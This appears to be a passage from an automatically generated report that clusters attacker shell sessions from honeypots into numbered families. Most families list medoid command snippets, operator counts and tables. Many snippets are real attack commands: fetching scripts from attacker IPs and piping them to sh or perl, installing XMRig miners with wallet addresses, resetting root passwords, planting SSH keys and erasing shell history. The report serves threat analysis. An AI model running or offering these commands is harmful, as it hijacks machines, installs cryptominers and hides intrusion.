Top operators: [('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1171bc0d72c7feb8 | 395e8848cb8e |        1 |               1 |

---

## Family 216

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `11b477a64c4a8aee` (Session: `5fb878cd1ac3`, n_rows=23)

**Medoid Execution Snippet:**
```text
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
crontab -l
w
uname -m
cat /proc/cpuinfo | grep model | grep name | wc -l
top
uname
uname -a
lscpu | grep Model
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk ' ...
```

**Consensus Skeleton (op, conn pairs):**
`[('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', 'EOS')]`

Top operators: [('grep', 9), ('uname', 6), ('awk', 3), ('cat', 3), ('free', 2), ('ls', 2), ('which', 2), ('crontab', 2), ('w', 2), ('wc', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 11b477a64c4a8aee | 5fb878cd1ac3 |       23 |               1 |

---

## Family 242

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1415fefb480806b8` (Session: `376869b23be3`, n_rows=4)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c
nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c
curl -s 185.244.149.237/.cache | perl
wget -qO - 185.244.149.237/.cache | perl ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('cut', '|'), ('uniq', ';'), ('nvidia-smi', '|'), ('grep', '|'), ('cut', '|'), ('uniq', ';'), ('curl', '|'), ('perl', ';'), ('wget', '|'), ('perl', 'EOS')]`

Top operators: [('grep', 2), ('cut', 2), ('uniq', 2), ('perl', 2), ('cat', 1), ('nvidia-smi', 1), ('curl', 1), ('wget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1415fefb480806b8 | 376869b23be3 |        4 |               1 |

---

## Family 351

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `155aa7325b558887` (Session: `354b2a9000c4`, n_rows=16)

**Medoid Execution Snippet:**
```text
development
linuxshell
..
enable
system
bash
shell
sh
terminal
watch 'sh'
/bin/busybox gay
echo -en "\x6d\x69\x6e\x65\x72\x77\x6f\x72\x64"
ls /home
ps aux
/bin/busybox gay
echo -en "\x6d\x69\x6e\x65\x72\x77\x6f\x72\x64" ;
```

**Consensus Skeleton (op, conn pairs):**
`[('development', ';'), ('linuxshell', ';'), ('..', ';'), ('enable', ';'), ('system', ';'), ('bash', ';'), ('shell', ';'), ('sh', ';'), ('terminal', ';'), ('watch', ';'), ('busybox', ';'), ('echo', ';'), ('ls', ';'), ('ps', ';'), ('busybox', ';'), ('echo', 'EOS')]`

Top operators: [('busybox', 2), ('echo', 2), ('development', 1), ('linuxshell', 1), ('..', 1), ('enable', 1), ('system', 1), ('bash', 1), ('shell', 1), ('sh', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 155aa7325b558887 | 354b2a9000c4 |       16 |               1 |

---

## Family 292

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1a95b4d2aebf27cf` (Session: `34b4bfce2b16`, n_rows=5)

**Medoid Execution Snippet:**
```text
nproc
cd /tmp
wget -qO - sshd.services/.dr | perl ;curl -O sshd.services/.dr ;perl .dr
rm -rf .dr*
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('nproc', ';'), ('cd', ';'), ('wget', '|'), ('perl', ';'), ('curl', ';'), ('perl', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('perl', 2), ('nproc', 1), ('cd', 1), ('wget', 1), ('curl', 1), ('rm', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1a95b4d2aebf27cf | 34b4bfce2b16 |        5 |               1 |

---

## Family 345

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1c77bcffbcfe71ed` (Session: `ee61ace5f7f5`, n_rows=9)

**Medoid Execution Snippet:**
```text
pkill screen
pkill Xorg
pkill x86_64
pkill x86
pkill xmrig
pkill cnrig
pkill xmr
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
echo root:t ...
```

**Consensus Skeleton (op, conn pairs):**
`[('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('curl', '|'), ('bash', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', 'EOS')]`

Top operators: [('kill', 7), ('bash', 2), ('curl', 1), ('echo', 1), ('chpasswd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1c77bcffbcfe71ed | ee61ace5f7f5 |        9 |               1 |

---

## Family 299

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1d4826fcf5aba11d` (Session: `b4148dfa04a7`, n_rows=3)

**Medoid Execution Snippet:**
```text
cd ~
chattr -ia .ssh
lockr -ia .ssh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('chattr', ';'), ('lockr', 'EOS')]`

Top operators: [('cd', 1), ('chattr', 1), ('lockr', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1d4826fcf5aba11d | b4148dfa04a7 |        3 |               1 |

---

## Family 305

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1da41d54391c3426` (Session: `c5eb19fffa32`, n_rows=4)

**Medoid Execution Snippet:**
```text
uname -a
echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash
nvidia-smi
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('nvidia-smi', ';'), ('curl', '|'), ('bash', 'EOS')]`

Top operators: [('bash', 2), ('uname', 1), ('echo', 1), ('chpasswd', 1), ('nvidia-smi', 1), ('curl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1da41d54391c3426 | c5eb19fffa32 |        4 |               1 |

---

## Family 232

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1e45021a0f776473` (Session: `bf0af9e32e38`, n_rows=10)

**Medoid Execution Snippet:**
```text
uname -a
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
history -n
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
cd;mkdir .ssh
cat .ssh/authorized_keys | grep -v 'heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >>.ssh/.auth_k ...
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('unset', ';'), ('history', ';'), ('export', ';'), ('export', ';'), ('export', ';'), ('cd', ';'), ('mkdir', ';'), ('cat', '|'), ('grep', ';'), ('echo', ';'), ('mv', 'EOS')]`

Top operators: [('export', 3), ('uname', 1), ('unset', 1), ('history', 1), ('cd', 1), ('mkdir', 1), ('cat', 1), ('grep', 1), ('echo', 1), ('mv', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1e45021a0f776473 | bf0af9e32e38 |       10 |               1 |

---

## Family 297

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1f3d5ba3e9c38d72` (Session: `25843ee98f7e`, n_rows=5)

**Medoid Execution Snippet:**
```text
clea
clear
ls
cd phil/
ls ;
```

**Consensus Skeleton (op, conn pairs):**
`[('clea', ';'), ('clear', ';'), ('ls', ';'), ('cd', ';'), ('ls', 'EOS')]`

Top operators: [('ls', 2), ('clea', 1), ('clear', 1), ('cd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1f3d5ba3e9c38d72 | 25843ee98f7e |        5 |               1 |

---

## Family 294

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `22f604a0d3fcf4d8` (Session: `5a262a13b8dc`, n_rows=17)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('lscpu', '|'), ('grep', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', 'EOS')]`

Top operators: [('grep', 6), ('awk', 4), ('cat', 3), ('cd', 2), ('echo', 2), ('head', 2), ('free', 2), ('ls', 2), ('which', 2), ('crontab', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 22f604a0d3fcf4d8 | 5a262a13b8dc |       17 |               1 |

---

## Family 186

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `24a21ea0b8b95430` (Session: `90542a6a8514`, n_rows=6)

**Medoid Execution Snippet:**
```text
apt update -y
apt install curl -y
cat /etc/issue
curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 49bGaMpdZtB5MqnyAwMk5u9bv3zjpyTE2RnQz2djYCm1goxkSkPuodnW8ayyjNLfLAA72Qm29uJT4RbxCAzbkVH6PxPAZZa
timeout 10 top
curl: option -L not recognized
curl:  ...
```

**Consensus Skeleton (op, conn pairs):**
`[('apt', ';'), ('apt', ';'), ('cat', ';'), ('curl', '|'), ('bash', ';'), ('timeout', ';'), ('curl:', ';'), ('curl:', 'EOS')]`

Top operators: [('apt', 2), ('curl:', 2), ('cat', 1), ('curl', 1), ('bash', 1), ('timeout', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 24a21ea0b8b95430 | 90542a6a8514 |        6 |               1 |

---

## Family 341

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2510a610df4ead7b` (Session: `d159e90f435b`, n_rows=2)

**Medoid Execution Snippet:**
```text
uname -a
lscpu ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('lscpu', 'EOS')]`

Top operators: [('uname', 1), ('lscpu', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2510a610df4ead7b | d159e90f435b |        2 |               1 |

---

## Family 293

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `25c0a756bbf0a63f` (Session: `042accd3ada2`, n_rows=3)

**Medoid Execution Snippet:**
```text
lspci | grep VGA
telnet 170.187.136.88 8181
exit ;
```

**Consensus Skeleton (op, conn pairs):**
`[('lspci', '|'), ('grep', ';'), ('telnet', ';'), ('exit', 'EOS')]`

Top operators: [('lspci', 1), ('grep', 1), ('telnet', 1), ('exit', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 25c0a756bbf0a63f | 042accd3ada2 |        3 |               1 |

---

## Family 340

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2626949337fb0226` (Session: `b79af4092bd9`, n_rows=2)

**Medoid Execution Snippet:**
```text
w
uname -a ;
```

**Consensus Skeleton (op, conn pairs):**
`[('w', ';'), ('uname', 'EOS')]`

Top operators: [('w', 1), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2626949337fb0226 | b79af4092bd9 |        2 |               1 |

---

## Family 326

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `26770ec4ce97c5b6` (Session: `52d2c96db72d`, n_rows=13)

**Medoid Execution Snippet:**
```text
ifconfig
cd /var/;wget http://46.249.32.109/bins.sh
chmod 777 bins.sh
sh bins.sh
rm -rf bins.sh
tftp -g 46.249.32.109 -r tftp1.sh
chmod 777 tftp1.sh
sh tftp1.sh
rm -rf tftp1.sh
tftp 46.249.32.109 -c get tftp2.sh
chmod 777 tftp2.sh
sh tftp2.sh
rm -rf tftp2.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('ifconfig', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', 'EOS')]`

Top operators: [('chmod', 3), ('sh', 3), ('rm', 3), ('tftp', 2), ('ifconfig', 1), ('cd', 1), ('wget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 26770ec4ce97c5b6 | 52d2c96db72d |       13 |               1 |

---

## Family 288

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `26afd3d1af082752` (Session: `01ca67e06b67`, n_rows=23)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo "root:tcrzFyTtxk2f" | chpasswd | bash
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
crontab -l
w
uname -m
cat /proc/cpuinfo | grep model | g ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('echo', ';'), ('rm', ';'), ('cat', ';'), ('echo', ';'), ('cat', ';'), ('sleep', '&&'), ('cd', ';'), ('echo', '|'), ('base64', '|'), ('bash', ';'), ('whoami', 'EOS')]`

Top operators: [('grep', 6), ('cat', 5), ('echo', 5), ('uname', 3), ('cd', 3), ('wc', 2), ('bash', 2), ('awk', 2), ('rm', 2), ('chpasswd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 26afd3d1af082752 | 01ca67e06b67 |       23 |               1 |

---

## Family 287

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2980ab00ee129659` (Session: `c642446084c1`, n_rows=1)

**Medoid Execution Snippet:**
```text
grep -m 1 'model name' /proc/cpuinfo | cut -d: -f2 && grep -c ^processor /proc/cpuinfo && grep -m 1 'stepping' /proc/cpuinfo | cut -d: -f2 &&  grep -m 1 'bogomips' /proc/cpuinfo | cut -d: -f2 &&  uptime && uname -a ;
```

**Consensus Skeleton (op, conn pairs):**
`[('grep', '|'), ('cut', '&&'), ('grep', '&&'), ('grep', '|'), ('cut', '&&'), ('grep', '|'), ('cut', '&&'), ('uptime', '&&'), ('uname', 'EOS')]`

Top operators: [('grep', 4), ('cut', 3), ('uptime', 1), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2980ab00ee129659 | c642446084c1 |        1 |               1 |

---

## Family 239

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2a60706ca6ed333d` (Session: `74269108c63e`, n_rows=83)

**Medoid Execution Snippet:**
```text
echo "Z""IGAZAGA148""8"
cat /dev/stdin | sh
#!/usr/bin/sh
#timeout=30
killSTDIN() {
processID=$(ps -u | grep -v 'grep' | grep cat | grep '/dev/stdin' | head -n 1 | awk -F ' ' '{ print $2 }')
ps -u | grep -v grep | grep cat | grep /dev/stdin | head -n 1 | awk -F   { print $2 }
$(kill -9 $processID)
k ...
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', ';'), ('cat', '|'), ('sh', ';'), ('killSTDIN', '|'), ('grep', '|'), ('grep', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('endScript', ';'), ('start', ';'), ('start', ';'), ('endScript', ';'), ('cat', '|'), ('sh', ';'), ('killSTDIN', '|'), ('grep', '|'), ('grep', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('endScript', ';'), ('start', ';'), ('start', ';'), ('endScript', ';'), ('cat', '|'), ('sh', ';'), ('killSTDIN', '|'), ('grep', '|'), ('grep', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('endScript', ';'), ('start', ';'), ('start', 'EOS')]`

Top operators: [('grep', 9), ('start', 6), ('endScript', 5), ('cat', 3), ('sh', 3), ('killSTDIN', 3), ('head', 3), ('awk', 3), ('echo', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2a60706ca6ed333d | 74269108c63e |       83 |               1 |

---

## Family 317

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2cd93178ff8b0c15` (Session: `6dfb00fb5652`, n_rows=9)

**Medoid Execution Snippet:**
```text
sudo hive-passwd `hostname`
echo `hostname`
pkill Xorg
pkill x11vnc
pkill Hello
systemctl stop shellinabox
history -c
hostname
hostname ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sudo', ';'), ('echo', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('systemctl', ';'), ('history', ';'), ('hostname', ';'), ('hostname', 'EOS')]`

Top operators: [('kill', 3), ('hostname', 2), ('sudo', 1), ('echo', 1), ('systemctl', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2cd93178ff8b0c15 | 6dfb00fb5652 |        9 |               1 |

---

## Family 263

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2f27ac7115294731` (Session: `60272de3c38e`, n_rows=4)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /run || cd /
wget http://31.210.20.138/python.sh chmod 777 python.sh
sh python.sh
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('sh', ';'), ('history', 'EOS')]`

Top operators: [('cd', 3), ('wget', 1), ('sh', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2f27ac7115294731 | 60272de3c38e |        4 |               1 |

---

## Family 215

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2f449a3d81486118` (Session: `0168d0f4f602`, n_rows=2)

**Medoid Execution Snippet:**
```text
cat /bin/sh || cat /bin/busybox || cat /bin/bash
wget http://2.58.149.116/w -O- |sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '||'), ('cat', '||'), ('cat', ';'), ('wget', '|'), ('sh', 'EOS')]`

Top operators: [('cat', 3), ('wget', 1), ('sh', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2f449a3d81486118 | 0168d0f4f602 |        2 |               1 |

---

## Family 203

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2fd0305ed3090eb3` (Session: `740bed4335af`, n_rows=1)

**Medoid Execution Snippet:**
```text
telnet 13.79.243.146 8167 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('telnet', 'EOS')]`

Top operators: [('telnet', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2fd0305ed3090eb3 | 740bed4335af |        1 |               1 |

---

## Family 306

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2fd157a46bc703c1` (Session: `0b15c8904fd6`, n_rows=7)

**Medoid Execution Snippet:**
```text
sh
enable
linuxshell
shell
system
bash
/bin/busybox ASUNA ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('enable', ';'), ('linuxshell', ';'), ('shell', ';'), ('system', ';'), ('bash', ';'), ('busybox', 'EOS')]`

Top operators: [('sh', 1), ('enable', 1), ('linuxshell', 1), ('shell', 1), ('system', 1), ('bash', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2fd157a46bc703c1 | 0b15c8904fd6 |        7 |               1 |

---

## Family 243

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2fde0de2ea592a47` (Session: `401b4336445e`, n_rows=4)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/run || cd /var/run || cd /mnt || cd /root || cd /;rm -rf a.sh
wget -O a.sh 107.189.12.110/a.sh || curl -o a.sh 107.189.12.110/a.sh
chmod 777 a.sh
./a.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('rm', ';'), ('wget', '||'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_2', 'EOS')]`

Top operators: [('cd', 6), ('rm', 1), ('wget', 1), ('curl', 1), ('chmod', 1), ('PH_EXEC_2', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2fde0de2ea592a47 | 401b4336445e |        4 |               1 |

---

## Family 285

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `30d21ccb5853c30f` (Session: `9d1eb9d55c2b`, n_rows=1)

**Medoid Execution Snippet:**
```text
sec-gpc: 1 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sec-gpc:', 'EOS')]`

Top operators: [('sec-gpc:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 30d21ccb5853c30f | 9d1eb9d55c2b |        1 |               1 |

---

## Family 311

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `32bbe48331380a57` (Session: `60d15c0e413e`, n_rows=5)

**Medoid Execution Snippet:**
```text
uname -a
hostname
uname -m&&pkill upnpsetup
sudo ./upnpsetup
./upnpsetup ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('hostname', ';'), ('uname', '&&'), ('kill', ';'), ('sudo', ';'), ('PH_EXEC_2', 'EOS')]`

Top operators: [('uname', 2), ('hostname', 1), ('kill', 1), ('sudo', 1), ('PH_EXEC_2', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 32bbe48331380a57 | 60d15c0e413e |        5 |               1 |

---

## Family 325

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `32df67d48c209acf` (Session: `2678b5666e4b`, n_rows=3)

**Medoid Execution Snippet:**
```text
en
password
sh run ;
```

**Consensus Skeleton (op, conn pairs):**
`[('en', ';'), ('password', ';'), ('sh', 'EOS')]`

Top operators: [('en', 1), ('password', 1), ('sh', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 32df67d48c209acf | 2678b5666e4b |        3 |               1 |

---

## Family 346

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `33b3f7bc1dbccefe` (Session: `4efdc1c9b828`, n_rows=3)

**Medoid Execution Snippet:**
```text
/ip cloud print
ifconfig
uname -a ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('ifconfig', ';'), ('uname', 'EOS')]`

Top operators: [('PH_EXEC_1', 1), ('ifconfig', 1), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 33b3f7bc1dbccefe | 4efdc1c9b828 |        3 |               1 |

---

## Family 255

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `37941c8c2f76b522` (Session: `8351f783f80d`, n_rows=2)

**Medoid Execution Snippet:**
```text
/bin/sh -c '/usr/bin/python && sleep 0'
/usr/bin/python && sleep 0 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('python', '&&'), ('sleep', 'EOS')]`

Top operators: [('sh', 1), ('python', 1), ('sleep', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 37941c8c2f76b522 | 8351f783f80d |        2 |               1 |

---

## Family 289

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `37b8c33415c55ab4` (Session: `6d42d895b232`, n_rows=2)

**Medoid Execution Snippet:**
```text
